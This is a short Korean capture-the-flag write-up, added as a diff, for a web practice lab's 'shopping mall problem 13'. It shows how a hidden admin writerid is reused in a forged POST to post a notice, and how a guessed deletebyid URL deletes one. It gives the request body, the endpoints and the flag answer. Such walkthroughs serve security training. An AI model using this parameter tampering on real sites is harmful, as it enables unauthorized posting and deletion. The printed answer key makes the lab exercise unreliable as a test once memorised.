@@ -1,0 +1,20 @@
+==================================
+* 쇼핑몰 문제 13번
+==================================
+[풀이과정]
+
+1. 풀이과정
+1.1. 공지사항 글 작성
+<input type="hidden" id="writerid" value="224">
+위의 숨겨진 writerid의 관리자 id를 확인한 후 아래와 같이 추가하고, originid도 224로 변경했더니 공지사항에 글 작성이 가능했다. 
+(POST POST /practice/practice13/notice/write 로 변경)
+_csrf=efb4762a-d443-4819-a9fd-cf393d5d01ed&id=&originid=224&title=asdf&content=sadf&writerid=224
+
+1.2. 공지사항 글 삭제
+qnq 글 삭제할 때 메서드를 확인했다: GET /practice/practice13/qna/removebyid?id=14873writerid=224 5971
+공지사항에서도 url에 removebyid를 추가했지만 되지 않았다. remove를 delete로 변경했더니 플래그가 나왔다.
+https://lab.eqst.co.kr:8110/practice/practice13/notice/deletebyid?id=5971&page=0
+
+2. 정답
+writerid_in_notice_view
+==================================
